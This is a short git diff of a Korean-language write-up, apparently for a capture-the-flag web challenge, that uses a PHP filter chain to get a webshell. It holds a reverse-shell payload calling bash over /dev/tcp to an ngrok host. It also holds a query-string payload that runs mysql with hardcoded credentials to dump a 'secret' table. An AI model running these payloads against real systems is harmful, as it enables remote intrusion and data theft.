@@ -164,7 +164,7 @@ windows
 
 - ngrok 라는 프로그램을 이용하여 포트포워딩 같은 작업 없이 웹쉘에 사용할 서버를 구축할 수 있음
 ```sh
-python3 php_filter_chain_generator.py --chain "<?php system(\"bash -c 'sh -i >& /dev/tcp/0.tcp.jp.ngrok.io/18884 0>&1'\"); ?> "
+python3 php_filter_chain_generator.py --chain "<?php system(\"bash -c 'sh -i >& /dev/tcp/0.tcp.jp.ngrok.io/14811 0>&1'\"); ?> "
 ```
 
 - 필터체인 생성성
@@ -179,3 +179,7 @@ php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.
 ?a=mysql -h127.0.0.1 -u"x-mas" -p"qwer1234" -e"select * from secret;" document 2>%261
 ```
 
+- 그냥 웹쉘에서 db에 접속하려고 하면 mysql_native_password 이슈 때문에 되지 않는다고 함
+- 근데 사실 왜 안되는지 정확히 이해를 못했음.. 추가예정..
+
+https://www.exploit-db.com/exploits/19092
